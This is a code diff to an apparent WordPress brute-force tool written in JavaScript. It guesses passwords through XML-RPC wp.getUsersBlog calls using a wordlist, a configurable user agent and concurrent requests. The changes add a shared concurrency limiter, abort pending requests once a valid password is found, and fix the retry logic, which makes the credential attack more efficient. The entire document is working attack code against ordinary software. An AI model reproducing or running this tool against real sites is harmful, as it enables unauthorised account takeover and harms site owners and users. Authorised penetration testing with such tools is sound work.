@@ -40,9 +40,10 @@ async function isXmlRpcEnable(host) {
  * @param {string} xmlData - XML form to call wp.getUsersBlog
  * @param {string} user - User to try
  * @param {string} password - Password to try
+ * @param {AbortSignal} signal - Signal to abort in-flight fetch requests
  * @returns {Promise<{}|{ isValid: boolean, user: string, password: string, isAdmin: boolean }>} - Credential
  */
-async function xmlLogin(host, xmlData, user, password) {
+async function xmlLogin(host, xmlData, user, password, signal) {
     let credential = { isValid: false }
 
     try {
@@ -54,7 +55,8 @@ async function xmlLogin(host, xmlData, user, password) {
                 'Content-Type': 'application/xml',
                 'User-Agent': appConfig.bruteforce.userAgent
             },
-            body: xmlGetUsersBody
+            body: xmlGetUsersBody,
+            signal
         })
 
         // Parse XML file
@@ -74,7 +76,12 @@ async function xmlLogin(host, xmlData, user, password) {
             }
         }
     } catch (error) {
-        console.error(error)
+        // Silence error logging for aborted requests when a valid password is found in a batch of already pending requests
+        if (error.type === "aborted") {
+            return { isValid: false }
+        }
+
+        utils.logging.error(error)
         throw Object.assign(new Error(error), { user, password })
     }
 
@@ -93,6 +100,7 @@ async function bruteForcePassword(host, users) {
     const xmlGetUsersBlogData = await utils.readFile('./xml/xmlrpc-getUsersBlog.xml')
     const pathToWordlist = path.join(appConfig.app.rootPath, appConfig.bruteforce.wordlist)
     const passwordsChunks = await utils.wordlistSplitting(pathToWordlist)
+    const limit = pLimit(appConfig.bruteforce.concurrencyLimit)
     let admins = []
     let nonAdmins = []
 
@@ -109,7 +117,7 @@ async function bruteForcePassword(host, users) {
         progressBar.start(passwordsChunks.totalSize, 0)
 
         for (let [index, chunk] of passwordsChunks.chunks.entries()) {
-            const credential = await LoginXmlBruteForce(host, xmlGetUsersBlogData, user, chunk)
+            const credential = await LoginXmlBruteForce(host, xmlGetUsersBlogData, user, chunk, limit)
             progressBar.increment(chunk.length)
 
             if (utils.isEmptyObject(credential) && index === (passwordsChunks.chunks.length - 1)) {
@@ -140,7 +148,7 @@ async function bruteForcePassword(host, users) {
 
     if (!admins.length && !nonAdmins.length) {
         console.log(`${ utils.printCheck.failure() } No credential found, quitting ...`)
-        utils.exit(0)
+        utils.exit(1)
     }
 
     return admins.concat(nonAdmins)
@@ -154,17 +162,29 @@ async function bruteForcePassword(host, users) {
  * @param {string} xmlGetUsersBlogData - XML data to send
  * @param {string} user - User to try
  * @param {array<string>} wordlist - Chunk of password
+ * @param {import('p-limit').LimitFunction} limit - Shared concurrency limiter
  * @param {number} [maxRetry=3] - Max retry if error
  * @returns {Promise<Object.<{}|{ isValid: boolean, user: string, password: string, isAdmin: boolean }>>}
  */
-async function LoginXmlBruteForce(host, xmlGetUsersBlogData, user, wordlist, maxRetry = 3) {
+async function LoginXmlBruteForce(host, xmlGetUsersBlogData, user, wordlist, limit, maxRetry = 3) {
     let credential = {}
     let requeue = []
     let foundPassword = false
-    const limit = pLimit(appConfig.bruteforce.concurrencyLimit)
 
+    const controller = new AbortController()
     const promises = wordlist.map(password => {
-        return limit(() => xmlLogin(host, xmlGetUsersBlogData, user, password))
+        return limit(async () => {
+            if (controller.signal.aborted) {
+                return { isValid: false }
+            }
+
+            const result = await xmlLogin(host, xmlGetUsersBlogData, user, password, controller.signal)
+            if (result.isValid) {
+                controller.abort()
+            }
+
+            return result
+        })
     })
 
     try {
@@ -188,7 +208,7 @@ async function LoginXmlBruteForce(host, xmlGetUsersBlogData, user, wordlist, max
 
         if (!foundPassword && requeue.length && maxRetry > 0) {
             maxRetry = maxRetry - 1
-            await LoginXmlBruteForce(host, xmlGetUsersBlogData, user, requeue, maxRetry)
+            credential = await LoginXmlBruteForce(host, xmlGetUsersBlogData, user, requeue, limit, maxRetry)
         }
     } catch (e) {
         console.error(e)
